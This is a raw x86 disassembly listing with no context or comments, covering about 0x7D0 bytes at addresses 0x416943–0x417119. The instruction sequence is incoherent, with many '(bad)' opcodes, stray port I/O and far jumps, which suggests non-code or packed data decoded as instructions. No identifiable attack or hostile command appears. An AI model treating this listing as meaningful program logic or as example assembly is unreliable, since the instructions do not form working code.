  416943:	repnz mov ch,0xa3
  416946:	iret   
  416947:	fchs   
  416949:	daa    
  41694a:	jmp    0x1941:0x200ea6d
  416951:	xchg   esp,eax
  416952:	test   DWORD PTR [esi-0x15b6fb02],esi
  416958:	cdq    
  416959:	sar    ch,cl
  41695b:	fimul  DWORD PTR [eax-0x6b]
  41695e:	push   ss
  41695f:	xor    esi,edx
  416961:	inc    edi
  416962:	inc    ebp
  416963:	adc    DWORD PTR [ecx-0x4b4d54c8],eax
  416969:	push   cs
  41696a:	imul   eax,DWORD PTR [edx+0x3390430d],0x44
  416971:	dec    edx
  416972:	popa   
  416973:	push   cs
  416974:	mov    ds,ebp
  416976:	mov    eax,ds:0xccbee00c
  41697b:	or     DWORD PTR [ecx+eiz*4],eax
  41697e:	lods   al,BYTE PTR ds:[esi]
  41697f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416980:	imul   ecx,DWORD PTR ss:[edx-0x16],0xba742433
  416988:	push   es
  416989:	sub    dh,BYTE PTR [edx+0x2c]
  41698c:	and    ebp,DWORD PTR [eax+0x22382c64]
  416992:	add    edi,DWORD PTR [esi]
  416994:	xor    ebp,DWORD PTR [eax-0x69]
  416997:	dec    esi
  416998:	fucomip st,st(5)
  41699a:	xor    eax,DWORD PTR [esi-0x75]
  41699d:	add    edx,DWORD PTR [eax]
  41699f:	fsubr  DWORD PTR ds:0xb26dfd43
  4169a5:	in     eax,dx
  4169a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169a7:	jbe    0x416991
  4169a9:	push   0x2d
  4169ab:	xor    eax,0x38e6fc4b
  4169b0:	daa    
  4169b1:	repnz (bad) 
  4169b3:	cmp    DWORD PTR ds:0xf4b80f3c,edx
  4169b9:	pop    ebx
  4169ba:	dec    ebp
  4169bb:	jp     0x416a12
  4169bd:	ret    0xebd0
  4169c0:	push   ds
  4169c1:	jp     0x4169ed
  4169c3:	sbb    DWORD PTR [edx+0x73d9d209],esi
  4169c9:	pushf  
  4169ca:	es int 0x85
  4169cd:	out    0xf5,eax
  4169cf:	repnz mov ebp,0xb8886c66
  4169d5:	adc    eax,0xec4f45df
  4169da:	sbb    eax,0x95d49991
  4169df:	sbb    BYTE PTR [esp+ebx*1+0x2785a3d8],bh
  4169e6:	pop    esp
  4169e7:	ins    BYTE PTR es:[edi],dx
  4169e8:	(bad)  
  4169e9:	mov    esp,0xecb10310
  4169ee:	ds push ebp
  4169f0:	sbb    al,0x8f
  4169f2:	xor    ch,bh
  4169f4:	loopne 0x416a15
  4169f6:	je     0x4169b6
  4169f8:	sbb    esi,DWORD PTR [edi]
  4169fa:	xchg   ebx,eax
  4169fb:	ud0    ecx,DWORD PTR [ebx-0x64]
  4169ff:	cld    
  416a00:	mov    WORD PTR [ebp+0x4465be0d],es
  416a06:	sbb    bh,BYTE PTR [esi+0x2df18b32]
  416a0c:	adc    edx,ebp
  416a0e:	and    DWORD PTR [ecx],ebp
  416a10:	or     ebx,ebp
  416a12:	fcmovbe st,st(6)
  416a14:	into   
  416a15:	pop    esp
  416a16:	mov    cl,0x60
  416a18:	push   eax
  416a19:	adc    DWORD PTR [ebp-0x69ffe7b6],ecx
  416a1f:	leave  
  416a20:	xor    eax,0x7801d017
  416a25:	out    0xa,eax
  416a27:	cmc    
  416a28:	sahf   
  416a29:	aam    0x52
  416a2b:	jle    0x416aa1
  416a2d:	clc    
  416a2e:	or     al,0x52
  416a30:	mov    bh,0x0
  416a32:	xchg   esp,eax
  416a33:	test   eax,0xe73f7393
  416a38:	xor    BYTE PTR [edx-0x1d],dl
  416a3b:	jns    0x4169f4
  416a3d:	loopne 0x416aa3
  416a3f:	jl     0x4169cc
  416a41:	mov    ebp,0x6d484c26
  416a46:	and    eax,DWORD PTR [edx+0x71]
  416a49:	mov    cl,0x7f
  416a4b:	inc    edx
  416a4c:	inc    edi
  416a4d:	or     DWORD PTR [esi+0x13],eax
  416a50:	icebp  
  416a51:	cmp    bh,0x5b
  416a54:	addr16 pop ds
  416a56:	mov    bl,0x68
  416a58:	push   ds
  416a59:	xor    BYTE PTR [esi],bl
  416a5b:	mov    al,bh
  416a5d:	call   0x29fd36b
  416a62:	retf   0x7c90
  416a65:	jmp    FWORD PTR [edi+0x38c18d40]
  416a6b:	sub    al,0x99
  416a6d:	xchg   esp,eax
  416a6e:	pop    ds
  416a6f:	pop    ebp
  416a70:	out    dx,eax
  416a71:	in     eax,0xf8
  416a73:	div    DWORD PTR [eax-0x71]
  416a76:	sub    DWORD PTR [ebp-0x2db8df91],edi
  416a7c:	mov    ds:0x4f91cbea,eax
  416a81:	(bad)  [si-0xa]
  416a85:	pop    ss
  416a86:	lock adc eax,0x9512f169
  416a8c:	add    BYTE PTR [edi],bh
  416a8e:	into   
  416a8f:	fist   DWORD PTR [ebx+edx*1]
  416a92:	call   0xac690b52
  416a97:	clc    
  416a98:	sbb    BYTE PTR [edx+eiz*1],dl
  416a9b:	dec    ebx
  416a9c:	add    cl,BYTE PTR [eax-0x12f04614]
  416aa2:	pusha  
  416aa3:	pop    ecx
  416aa4:	fcom   st(4)
  416aa6:	or     cl,BYTE PTR [ebx]
  416aa8:	aas    
  416aa9:	mov    esp,0x1a29f3fe
  416aae:	pop    esi
  416aaf:	cwde   
  416ab0:	sbb    ch,cl
  416ab2:	in     al,dx
  416ab3:	(bad)  
  416ab4:	mov    edx,0x32f03296
  416ab9:	dec    edi
  416aba:	ror    DWORD PTR [eax],0x97
  416abd:	or     esp,esi
  416abf:	retf   0x6931
  416ac2:	add    eax,0xcf4abca3
  416ac7:	lea    ebx,[ebx]
  416ac9:	cmp    eax,0xd4d15371
  416ace:	dec    ebp
  416acf:	clc    
  416ad0:	push   edi
  416ad1:	sub    eax,0xf5a2738b
  416ad6:	cmp    DWORD PTR [eax-0x41],ebx
  416ad9:	mov    ch,0x2d
  416adb:	jmp    0xdbeb:0x2d2e7a5f
  416ae2:	or     DWORD PTR [esi-0x3b189ac4],ebp
  416ae8:	or     DWORD PTR [edi-0x69],ecx
  416aeb:	loope  0x416ac8
  416aed:	jmp    0x927df0f1
  416af2:	es call 0x3a36:0x17873736
  416afa:	xchg   BYTE PTR [esi+0x5968c51e],ch
  416b00:	not    edx
  416b02:	dec    ebp
  416b03:	das    
  416b04:	(bad)  
  416b05:	icebp  
  416b06:	(bad)  
  416b07:	fild   QWORD PTR [esi-0x54]
  416b0a:	cmc    
  416b0b:	fiadd  DWORD PTR [eax-0x2190861e]
  416b11:	in     eax,0x4d
  416b13:	ror    BYTE PTR [edi+0x5d],cl
  416b16:	add    DWORD PTR fs:0x4b21c0fa,ebx
  416b1d:	xor    DWORD PTR [ebp-0x7b132847],eax
  416b23:	fbld   TBYTE PTR [esi]
  416b25:	jb     0x416b3d
  416b27:	test   al,0x7c
  416b29:	xor    al,0x5
  416b2b:	leave  
  416b2c:	fadd   QWORD PTR [ebx+0x77e69bed]
  416b32:	push   0x53
  416b34:	lds    edx,FWORD PTR [ebx+0x62]
  416b37:	push   0xca45d1f9
  416b3c:	mov    esi,0x8a5344c
  416b41:	mov    ebx,0x6c3c54a7
  416b46:	retf   
  416b47:	pop    esi
  416b48:	push   ebx
  416b49:	cmp    eax,0x4d59e599
  416b4e:	mov    gs,WORD PTR [ebx+eax*4-0x16]
  416b52:	cmp    al,0xef
  416b54:	and    esi,DWORD PTR [ebx+0xe9d6f6e]
  416b5a:	mov    ah,0x88
  416b5c:	lock push ecx
  416b5e:	scas   eax,DWORD PTR es:[edi]
  416b5f:	into   
  416b60:	adc    ch,BYTE PTR [eax]
  416b62:	minps  xmm6,xmm5
  416b65:	push   es
  416b66:	dec    ebp
  416b67:	test   DWORD PTR [ebx],esi
  416b69:	mov    dh,0x5b
  416b6b:	mov    al,ds:0x4d726fdd
  416b70:	rol    BYTE PTR [esi],cl
  416b72:	retf   0x5363
  416b75:	sub    BYTE PTR ds:0xcc741c0d,ah
  416b7b:	adc    al,0x80
  416b7d:	mov    cl,0xf1
  416b7f:	sub    cl,BYTE PTR [ecx+eax*1-0x18]
  416b83:	lock mov dh,0x2c
  416b86:	repz adc eax,0x9d8d7f1
  416b8c:	(bad)  
  416b8d:	fisttp WORD PTR [ebp+0x40]
  416b90:	aad    0xd6
  416b92:	inc    ebx
  416b93:	push   esp
  416b94:	daa    
  416b95:	sar    bl,cl
  416b97:	scas   al,BYTE PTR es:[edi]
  416b98:	xchg   DWORD PTR [ebx+0x62afc9e6],eax
  416b9e:	pop    ecx
  416b9f:	push   esi
  416ba0:	shl    edi,0xef
  416ba3:	sub    bh,BYTE PTR [edi+0x43]
  416ba6:	imul   DWORD PTR [esi+0xf]
  416ba9:	retf   0xeab
  416bac:	dec    esp
  416bad:	add    eax,0x7c3646e1
  416bb2:	inc    BYTE PTR [esi-0x21]
  416bb5:	pop    ecx
  416bb6:	add    ch,ch
  416bb8:	mov    ecx,0xf22cda24
  416bbd:	xchg   ebx,eax
  416bbe:	dec    esp
  416bbf:	push   ecx
  416bc0:	xchg   esi,eax
  416bc1:	adc    bl,bl
  416bc3:	into   
  416bc4:	lahf   
  416bc5:	dec    eax
  416bc6:	jl     0x416bd4
  416bc8:	jle    0x416bce
  416bca:	jnp    0x416b55
  416bcc:	fisub  DWORD PTR [esi+0x571ddfa6]
  416bd2:	xchg   ebp,eax
  416bd3:	pop    ds
  416bd4:	mov    esp,0x1c792e66
  416bd9:	jmp    0x416be5
  416bdb:	hlt    
  416bdc:	jb     0x416b6f
  416bde:	inc    ebp
  416bdf:	pop    es
  416be0:	fistp  DWORD PTR [ecx-0x23]
  416be3:	and    ax,0x1dd3
  416be7:	sub    BYTE PTR [esi+0x51d2bd46],al
  416bed:	inc    edx
  416bee:	outs   dx,BYTE PTR ds:[esi]
  416bef:	loope  0x416c10
  416bf1:	hlt    
  416bf2:	leave  
  416bf3:	int    0x51
  416bf5:	ret    
  416bf6:	xor    eax,0x9eafd1a2
  416bfb:	pop    esi
  416bfc:	ror    al,0x93
  416bff:	xchg   DWORD PTR [esi],ecx
  416c01:	stc    
  416c02:	cmp    eax,0xda50511
  416c07:	pop    DWORD PTR [edi]
  416c09:	loop   0x416bf1
  416c0b:	not    BYTE PTR [ecx-0x60740db1]
  416c11:	mov    ds:0x54c2281b,al
  416c16:	jns    0x416bc3
  416c18:	dec    ebx
  416c19:	ret    
  416c1a:	outs   dx,DWORD PTR ds:[esi]
  416c1b:	and    eax,0xc4231042
  416c20:	shr    BYTE PTR [eax+edi*1+0x60],0x17
  416c25:	sbb    cl,BYTE PTR [ebp-0x53a3d78a]
  416c2b:	jne    0x416c6a
  416c2d:	xchg   DWORD PTR [ebp-0x72],edi
  416c30:	and    ebp,DWORD PTR [esi+0x52b559df]
  416c36:	pop    esp
  416c37:	push   esp
  416c38:	mov    dh,0xe
  416c3a:	sbb    DWORD PTR [edx+0x36],ebp
  416c3d:	scas   al,BYTE PTR es:[edi]
  416c3e:	cmp    al,BYTE PTR [esi+ebp*8+0x4b]
  416c42:	jg     0x416c52
  416c44:	aam    0x7a
  416c46:	mov    edx,0x8db2e51a
  416c4b:	lock xor eax,0xa450a85d
  416c51:	shl    DWORD PTR [ecx-0x5c],0x73
  416c55:	cmp    DWORD PTR [ebp-0x69],edi
  416c58:	or     DWORD PTR [edi+0x61],ebp
  416c5b:	xchg   esi,eax
  416c5c:	out    0x9d,al
  416c5e:	int3   
  416c5f:	inc    edx
  416c60:	pop    ss
  416c61:	js     0x416c95
  416c63:	push   ecx
  416c64:	xchg   edx,eax
  416c65:	mov    ah,0xf1
  416c67:	mov    ebx,DWORD PTR [eax+0x1a]
  416c6a:	not    DWORD PTR [edx]
  416c6c:	mov    bh,0xb7
  416c6e:	xchg   esi,eax
  416c6f:	rol    BYTE PTR [ebp+0x22286b25],1
  416c75:	ror    esp,0xff
  416c78:	shr    BYTE PTR [edx+0x65830ce],0x12
  416c7f:	sub    DWORD PTR [edx-0x6],ebp
  416c82:	jno    0x416ca3
  416c84:	scas   eax,DWORD PTR es:[edi]
  416c85:	fs push ecx
  416c87:	fnstcw WORD PTR [edx+ebp*2-0x3c]
  416c8b:	test   eax,0x1b59abbe
  416c90:	pop    ds
  416c91:	sub    dl,0xfa
  416c94:	mov    ebx,DWORD PTR [edi]
  416c96:	xchg   edi,eax
  416c97:	enter  0x5c3f,0x98
  416c9b:	iret   
  416c9c:	inc    eax
  416c9d:	inc    edi
  416c9e:	xchg   DWORD PTR [ecx+0x299aa229],edi
  416ca4:	pop    ebx
  416ca5:	jns    0x416c56
  416ca7:	out    0x1a,al
  416ca9:	cmp    eax,0x1a769f27
  416cae:	dec    esp
  416caf:	inc    esp
  416cb0:	nop
  416cb1:	(bad)  
  416cb2:	lods   al,BYTE PTR ds:[esi]
  416cb3:	les    eax,FWORD PTR [edi+eiz*4]
  416cb6:	sbb    edx,DWORD PTR [ebx]
  416cb8:	jne    0x416c4e
  416cba:	adc    esi,DWORD PTR [ebp-0x80]
  416cbd:	and    eax,0xc300d487
  416cc2:	test   BYTE PTR ds:0x38e0d818,ch
  416cc8:	sub    ch,ch
  416cca:	mov    edx,0x376ff549
  416ccf:	pop    esi
  416cd0:	jne    0x416d0e
  416cd2:	cs jae 0x416cb0
  416cd5:	addr16 iret 
  416cd7:	call   0xcf13:0x30674fdd
  416cde:	jo     0x416ca9
  416ce0:	cld    
  416ce1:	inc    esi
  416ce2:	setp   BYTE PTR [ecx-0xd]
  416ce6:	push   edx
  416ce7:	jns    0x416c9a
  416ce9:	out    dx,al
  416cea:	inc    ebx
  416ceb:	adc    DWORD PTR [ecx],eax
  416ced:	pop    esi
  416cee:	mov    BYTE PTR [ecx],0xbb
  416cf1:	jg     0x416d03
  416cf3:	push   edx
  416cf4:	hlt    
  416cf5:	push   esp
  416cf6:	(bad)  
  416cf7:	retf   0x50af
  416cfa:	push   esp
  416cfb:	adc    BYTE PTR [edx+0x38],ch
  416cfe:	shl    BYTE PTR [edx],1
  416d00:	pop    es
  416d01:	retf   
  416d02:	jne    0x416cc8
  416d04:	adc    eax,DWORD PTR [esi+0x35]
  416d07:	loope  0x416c93
  416d09:	mov    ah,0xfe
  416d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d0c:	pop    esi
  416d0d:	xchg   BYTE PTR ds:[edx],dh
  416d10:	data16 xor BYTE PTR [esi+0x46],ch
  416d14:	xchg   ch,al
  416d16:	repz hlt 
  416d18:	or     esi,DWORD PTR es:[edi]
  416d1b:	and    DWORD PTR [edx+0x18],esp
  416d1e:	push   cs
  416d1f:	outs   dx,DWORD PTR ds:[esi]
  416d20:	sub    BYTE PTR [edi+0x27303ea],0x4a
  416d27:	cmp    BYTE PTR [edx],ch
  416d29:	imul   esp,DWORD PTR [edx+0x4176f836],0xbb26b100
  416d33:	dec    edx
  416d34:	hlt    
  416d35:	mov    al,0xe
  416d37:	jbe    0x416cbd
  416d39:	mov    ebx,0xe50813a6
  416d3e:	popa   
  416d3f:	in     eax,dx
  416d40:	call   DWORD PTR [ecx-0x18]
  416d43:	inc    esi
  416d44:	in     al,0x7f
  416d46:	cmp    ah,BYTE PTR [eax]
  416d48:	aad    0xed
  416d4a:	mov    eax,esi
  416d4c:	inc    ebp
  416d4d:	in     al,0x1d
  416d4f:	scas   al,BYTE PTR es:[edi]
  416d50:	in     al,dx
  416d51:	xor    BYTE PTR [eax+eax*2+0x1d],ah
  416d55:	adc    BYTE PTR [eax+0x20],dl
  416d58:	ds or  edx,eax
  416d5b:	inc    ebp
  416d5c:	mov    eax,0x7b5d400a
  416d61:	mov    cs,WORD PTR [ebx-0x3]
  416d64:	icebp  
  416d65:	test   al,0xc0
  416d67:	xor    cl,BYTE PTR [esp+ebp*4]
  416d6a:	cmp    al,0xaa
  416d6c:	dec    ebx
  416d6d:	popf   
  416d6e:	cmc    
  416d6f:	lock mov ebp,0x648fbd81
  416d75:	push   es
  416d76:	pop    esi
  416d77:	jnp    0x416d09
  416d79:	jno    0x416d97
  416d7b:	jl     0x416db5
  416d7d:	sti    
  416d7e:	sub    BYTE PTR [edx+0x54c84573],bl
  416d84:	cs aam 0x3c
  416d87:	dec    esp
  416d88:	cmc    
  416d89:	das    
  416d8a:	pop    eax
  416d8b:	stos   BYTE PTR es:[edi],al
  416d8c:	pop    edx
  416d8d:	aad    0xae
  416d8f:	push   eax
  416d90:	and    DWORD PTR [eax+esi*2-0x34],ebx
  416d94:	shl    DWORD PTR [edx],1
  416d96:	fldcw  WORD PTR [eax-0x27380118]
  416d9d:	fadd   DWORD PTR [edi-0x9]
  416da0:	push   esp
  416da1:	fs scas al,BYTE PTR es:[edi]
  416da3:	dec    esi
  416da4:	clc    
  416da5:	xchg   BYTE PTR [ebp+0x298b7b96],dl
  416dab:	setge  BYTE PTR [ebx-0x1eceab8a]
  416db2:	mov    ds:0x3fd11722,eax
  416db7:	iret   
  416db8:	in     eax,0x85
  416dba:	cmp    BYTE PTR [esi+0x7d],bl
  416dbd:	out    dx,al
  416dbe:	pusha  
  416dbf:	imul   ecx,DWORD PTR [ecx-0x7c72ab5a],0xffffffbf
  416dc6:	test   al,0xfe
  416dc8:	pop    edi
  416dc9:	push   esp
  416dca:	mov    esi,0x33de2eaf
  416dcf:	ja     0x416dc3
  416dd1:	cmp    dl,ah
  416dd3:	sar    DWORD PTR [edx],cl
  416dd5:	sbb    DWORD PTR [edx+0x53180410],ecx
  416ddb:	pushf  
  416ddc:	inc    ebx
  416ddd:	fs jno 0x416e0e
  416de0:	and    BYTE PTR [ebx+ebp*1],0xd3
  416de4:	and    edx,DWORD PTR ds:0x6adf8ddb
  416dea:	cmp    BYTE PTR [edi-0x3d],0x2e
  416dee:	cmp    eax,0xf60f9d19
  416df3:	sbb    dl,al
  416df5:	lods   eax,DWORD PTR ds:[esi]
  416df6:	iret   
  416df7:	mov    ebx,0xdaa6aa38
  416dfc:	dec    edx
  416dfd:	int3   
  416dfe:	mov    eax,ds:0xe7af37d1
  416e03:	xchg   esp,eax
  416e04:	pop    es
  416e05:	fs mov esi,0x2311cf0a
  416e0b:	cmc    
  416e0c:	and    ch,BYTE PTR [edi+0x114d35ed]
  416e12:	je     0x416e78
  416e14:	adc    bh,BYTE PTR gs:[esi+0x45]
  416e18:	loopne 0x416e8d
  416e1a:	or     al,0xee
  416e1c:	ret    
  416e1d:	pop    edx
  416e1e:	xchg   edx,eax
  416e1f:	xor    edx,DWORD PTR ds:0xe592880
  416e25:	cwde   
  416e26:	mov    esp,0xc498f160
  416e2b:	sbb    eax,0x28898c22
  416e30:	adc    DWORD PTR [edi],ecx
  416e32:	and    DWORD PTR [ecx+ebp*8],ebx
  416e35:	jno    0x416e43
  416e37:	or     dl,BYTE PTR [edi-0x17]
  416e3a:	push   esp
  416e3b:	jmp    0x56e0:0xcaa7a6e0
  416e42:	out    0x36,eax
  416e44:	mov    ecx,ebp
  416e46:	pop    esi
  416e47:	jb     0x416e1a
  416e49:	mov    al,0x1a
  416e4b:	mov    eax,0xd4574edb
  416e50:	add    edi,DWORD PTR [esi]
  416e52:	mov    dh,0x19
  416e54:	inc    eax
  416e55:	outs   dx,DWORD PTR ds:[si]
  416e57:	retf   0xdd1d
  416e5a:	test   BYTE PTR [edx-0x70],dh
  416e5d:	daa    
  416e5e:	cs cmp eax,0x5043b545
  416e64:	cmp    edi,DWORD PTR [edi+0x43]
  416e67:	cwde   
  416e68:	mov    ah,0x7f
  416e6a:	fldcw  WORD PTR [edx+0x31b35337]
  416e70:	or     eax,0x2035c63f
  416e75:	mov    dl,0xb9
  416e77:	inc    esi
  416e78:	js     0x416e66
  416e7a:	mov    ebp,0x2b37d44a
  416e7f:	or     DWORD PTR [edx],eax
  416e81:	or     eax,0xbe2dd3c6
  416e86:	add    eax,0x4d8a1389
  416e8b:	push   ebx
  416e8c:	iret   
  416e8d:	test   DWORD PTR [eax-0x7],edx
  416e90:	rcr    DWORD PTR [eax],0x9f
  416e93:	xchg   esi,eax
  416e94:	(bad)  
  416e95:	sbb    dh,ch
  416e97:	mov    eax,0x184eb20
  416e9c:	adc    eax,0x216fbf1a
  416ea1:	add    cl,BYTE PTR [edi+0x6e72646a]
  416ea7:	jmp    0x416e73
  416ea9:	inc    esp
  416eaa:	cmp    dl,bh
  416eac:	push   0x25
  416eae:	push   esi
  416eaf:	sub    BYTE PTR [edx+0x539a8de6],al
  416eb5:	xor    DWORD PTR ss:0xa2643918,ebx
  416ebc:	adc    eax,0xea3d75ff
  416ec1:	loope  0x416efa
  416ec3:	adc    eax,0x5df1f351
  416ec8:	mov    eax,0xce026a38
  416ecd:	jne    0x416ec0
  416ecf:	adc    BYTE PTR [edx+0x7d],0x65
  416ed3:	add    BYTE PTR ds:[edx],0xe6
  416ed7:	cld    
  416ed8:	test   DWORD PTR [edx+0x3c9e3de7],esi
  416ede:	add    BYTE PTR [ecx+0x7406177c],bl
  416ee4:	and    DWORD PTR [ebx],esp
  416ee6:	ret    
  416ee7:	cwde   
  416ee8:	xlat   BYTE PTR es:[ebx]
  416eea:	sahf   
  416eeb:	push   ss
  416eec:	sub    ebp,eax
  416eee:	adc    ch,BYTE PTR [edx-0x2a]
  416ef1:	repz das 
  416ef3:	es mov ecx,0x8e6bc035
  416ef9:	aaa    
  416efa:	inc    esp
  416efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416efc:	dec    edi
  416efd:	clc    
  416efe:	retf   0xb1ed
  416f01:	test   BYTE PTR [edi+ebx*8],cl
  416f04:	stos   DWORD PTR es:[edi],eax
  416f05:	pop    esi
  416f06:	cli    
  416f07:	adc    BYTE PTR [edx],bh
  416f09:	jg     0x416f27
  416f0b:	clc    
  416f0c:	ins    BYTE PTR es:[edi],dx
  416f0d:	pushf  
  416f0e:	mov    gs,WORD PTR [eax]
  416f10:	lods   al,BYTE PTR ds:[esi]
  416f11:	fmul   DWORD PTR [edx-0xa]
  416f14:	aam    0x36
  416f16:	popa   
  416f17:	sbb    eax,0x297602b7
  416f1c:	add    cl,BYTE PTR [eax-0x4e]
  416f1f:	cmp    al,0x6c
  416f21:	dec    ebp
  416f22:	and    cl,BYTE PTR [edi]
  416f24:	cs xchg ecx,eax
  416f26:	fmulp  st(4),st
  416f28:	adc    bl,BYTE PTR [edx-0x61630716]
  416f2e:	arpl   si,cx
  416f30:	fidiv  WORD PTR [edx]
  416f32:	pop    esi
  416f33:	jle    0x416f1c
  416f35:	in     al,dx
  416f36:	and    eax,0x94869bda
  416f3b:	xchg   BYTE PTR [ebp-0x6f],bl
  416f3e:	push   0x4b2ccf82
  416f43:	add    dl,BYTE PTR [edi]
  416f45:	rol    BYTE PTR [ebp+0xe],1
  416f48:	in     al,dx
  416f49:	xor    al,0x9b
  416f4b:	xor    ebx,DWORD PTR [ebx+0x1e82fb20]
  416f51:	sub    esi,DWORD PTR [edx]
  416f53:	scas   eax,DWORD PTR es:[di]
  416f55:	je     0x416f68
  416f57:	ret    0x3647
  416f5a:	std    
  416f5b:	ret    0xee0b
  416f5e:	aam    0x2b
  416f60:	and    esi,DWORD PTR [esi+0x6acdf9d5]
  416f66:	hlt    
  416f67:	mov    ebp,ebp
  416f69:	add    ebp,DWORD PTR [esi+0xdb85359]
  416f6f:	xor    edi,DWORD PTR [edi-0xf]
  416f72:	outs   dx,DWORD PTR ds:[esi]
  416f73:	mov    dh,0x32
  416f75:	ja     0x416f74
  416f77:	es xor al,0x2f
  416f7a:	or     DWORD PTR [ecx-0x69],ebp
  416f7d:	imul   esi,DWORD PTR [esi+ebx*4],0xffffffd6
  416f81:	xchg   edx,eax
  416f82:	cs dec esi
  416f84:	mov    al,ds:0xf597ab2
  416f89:	sub    ebx,esi
  416f8b:	xchg   edx,eax
  416f8c:	fwait
  416f8d:	cli    
  416f8e:	jmp    0x6e45:0xef58749b
  416f95:	repnz xor DWORD PTR [ecx+0x4182ef59],esp
  416f9c:	in     eax,0x8
  416f9e:	je     0x416fb9
  416fa0:	je     0x416f54
  416fa2:	loope  0x416f60
  416fa4:	mov    ah,0x25
  416fa6:	(bad)  
  416fa7:	sar    DWORD PTR [ebp-0x69cb59fa],1
  416fad:	mov    bh,0x31
  416faf:	jmp    0x27da:0x34133e16
  416fb6:	mov    al,0x51
  416fb8:	stos   BYTE PTR es:[edi],al
  416fb9:	stc    
  416fba:	das    
  416fbb:	or     bl,ch
  416fbd:	or     eax,0xfef9cf7
  416fc2:	stc    
  416fc3:	out    dx,eax
  416fc4:	push   edi
  416fc5:	sar    DWORD PTR [edi-0x7126835b],1
  416fcb:	test   al,0xec
  416fcd:	jmp    0x5aa39801
  416fd2:	test   al,0x6b
  416fd4:	push   ebp
  416fd5:	mov    eax,ds:0x3d6eb42a
  416fda:	lea    edi,[edx-0x59]
  416fdd:	jp     0x41702a
  416fdf:	or     cl,BYTE PTR [esi]
  416fe1:	popf   
  416fe2:	fcomp  QWORD PTR [edi]
  416fe4:	and    bh,BYTE PTR [ebx+0x17]
  416fe7:	mov    ds:0xc6c7071f,al
  416fec:	lods   eax,DWORD PTR ds:[esi]
  416fed:	mov    edx,DWORD PTR [edi+0x6a]
  416ff0:	in     al,dx
  416ff1:	or     BYTE PTR [eax-0x3f63531c],0x12
  416ff8:	add    BYTE PTR [edi],dl
  416ffa:	popa   
  416ffb:	cmp    eax,0xde509dbf
  417000:	sub    al,0xab
  417002:	dec    edx
  417003:	sbb    esi,0xffffffe0
  417006:	or     DWORD PTR [eax-0x37],edx
  417009:	mov    WORD PTR [edi+0x5f],?
  41700c:	or     bh,BYTE PTR [edx]
  41700e:	shl    al,1
  417010:	push   ds
  417011:	mov    ah,dl
  417013:	fs rcl dh,cl
  417016:	dec    ebp
  417017:	sbb    WORD PTR [edx],ax
  41701a:	sbb    ebx,ebx
  41701c:	pop    ebx
  41701d:	mov    al,ds:0x9d8aad82
  417022:	stos   BYTE PTR es:[edi],al
  417023:	dec    ebx
  417024:	(bad)  
  417025:	int3   
  417026:	(bad)  
  417027:	jnp    0x416ff3
  417029:	repz jb 0x416fef
  41702c:	sub    ah,al
  41702e:	push   ebp
  41702f:	push   ebp
  417030:	clc    
  417031:	mov    al,ds:0x80e0ce07
  417036:	in     eax,dx
  417037:	div    BYTE PTR [esi+0x7f]
  41703a:	stos   DWORD PTR es:[edi],eax
  41703b:	dec    edx
  41703c:	add    dh,BYTE PTR [ecx+esi*8+0x413f63e]
  417043:	repz xor BYTE PTR [eax-0x5c3d2b63],bl
  41704a:	dec    ebp
  41704b:	sbb    al,0xf
  41704d:	cmp    BYTE PTR [edi+0x13f96b7b],0x7f
  417054:	sar    DWORD PTR [eax+0x5cc3eec0],1
  41705a:	or     BYTE PTR [edi+0x7c1d427b],cl
  417060:	popa   
  417061:	rol    DWORD PTR [esi+ecx*8+0x64c75d8d],cl
  417068:	fidivr WORD PTR [edi-0x52606058]
  41706e:	call   0xc6af4892
  417073:	retf   0xd92f
  417076:	test   al,0x1a
  417078:	dec    edx
  417079:	push   edi
  41707a:	adc    DWORD PTR [eax],esi
  41707c:	mov    dl,0x35
  41707e:	xchg   ebp,eax
  41707f:	and    dh,BYTE PTR [eax]
  417081:	pusha  
  417082:	into   
  417083:	push   ecx
  417084:	mov    ecx,0x5e98d8c0
  417089:	fwait
  41708a:	jns    0x4170bc
  41708c:	jnp    0x4170f9
  41708e:	add    DWORD PTR es:[esi],edx
  417091:	sbb    cl,dl
  417093:	sbb    ebp,esi
  417095:	clc    
  417096:	out    dx,eax
  417097:	adc    al,0x14
  417099:	mov    dl,0x28
  41709b:	sub    eax,DWORD PTR [edi+0x79a3307f]
  4170a1:	fadd   DWORD PTR [esp+ecx*2-0x7c]
  4170a5:	jg     0x417078
  4170a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170a8:	lods   eax,DWORD PTR ds:[esi]
  4170a9:	mov    esi,0x8d607c75
  4170ae:	call   0x7759f0e1
  4170b3:	jno    0x4170ca
  4170b5:	shl    DWORD PTR [esi],1
  4170b7:	pop    edx
  4170b8:	cs dec esi
  4170ba:	outs   dx,BYTE PTR ds:[esi]
  4170bb:	jne    0x4170ee
  4170bd:	psadbw mm4,QWORD PTR es:[edi+0x33a213c8]
  4170c5:	mov    ds:0xb4857e2d,al
  4170ca:	(bad)  
  4170cb:	jmp    FWORD PTR [eax+ecx*2]
  4170ce:	mov    eax,0x8d229bbc
  4170d3:	out    dx,al
  4170d4:	stos   DWORD PTR es:[edi],eax
  4170d5:	mov    ah,0x38
  4170d7:	and    DWORD PTR [edx+0x65],edi
  4170da:	push   eax
  4170db:	xchg   ecx,ecx
  4170dd:	jbe    0x41707a
  4170df:	dec    ebp
  4170e0:	sbb    cl,ah
  4170e2:	jge    0x417084
  4170e4:	(bad)  
  4170e5:	pop    edi
  4170e6:	jbe    0x41706d
  4170e8:	cdq    
  4170e9:	test   al,0x42
  4170eb:	sub    DWORD PTR [edx-0x50],ecx
  4170ee:	lods   al,BYTE PTR ds:[esi]
  4170ef:	or     al,BYTE PTR [ecx]
  4170f1:	sti    
  4170f2:	cmp    al,BYTE PTR [edi]
  4170f4:	lods   eax,DWORD PTR ds:[esi]
  4170f5:	fdivr  st,st(6)
  4170f7:	out    0xaf,al
  4170f9:	sub    BYTE PTR [esi],0x51
  4170fc:	and    dl,bh
  4170fe:	jbe    0x4170af
  417100:	add    cl,BYTE PTR [eax]
  417102:	cli    
  417103:	mov    ebx,0x875d0ae0
  417108:	repnz (bad) 
  41710a:	adc    bh,cl
  41710c:	ins    DWORD PTR es:[edi],dx
  41710d:	out    dx,al
  41710e:	mov    dl,0x3
  417110:	jl     0x4170ef
  417112:	lods   eax,DWORD PTR ds:[esi]
  417113:	inc    ebx
  417114:	mov    esi,0xd06d0db5
  417119:	pop    ebx
